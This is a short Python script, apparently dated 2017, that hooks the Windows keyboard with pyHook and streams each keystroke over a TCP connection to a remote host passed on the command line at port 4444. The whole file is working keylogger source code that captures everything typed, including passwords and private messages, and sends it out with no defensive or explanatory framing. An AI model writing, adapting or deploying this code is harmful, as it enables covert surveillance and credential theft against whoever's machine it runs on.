# Surprior, 2017

import pyHook, socket, pythoncom, sys
from threading import Thread, Lock

HOST = sys.argv[1]
PORT = 4444

lock = Lock()

# Handler using Thread and Lock
def kb_handler_thread(c):
	lock.acquire()
	print(c)
	s.send(c.encode())
	lock.release()

def kb_handler(e):
	try:
		t = Thread(target=kb_handler_thread, args=(e.Key,))
		t.start()
	except:
		pass
	return True

# Simpler version 
def kb_handler2(e):
	lock.acquire()
	print(e.Key)
	s.send(e.Key.encode())
	lock.release()
	return True

if __name__ == '__main__':
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	
	hm = pyHook.HookManager()
	hm.KeyDown = kb_handler2
	hm.HookKeyboard()
	pythoncom.PumpMessages()
	
	s.close()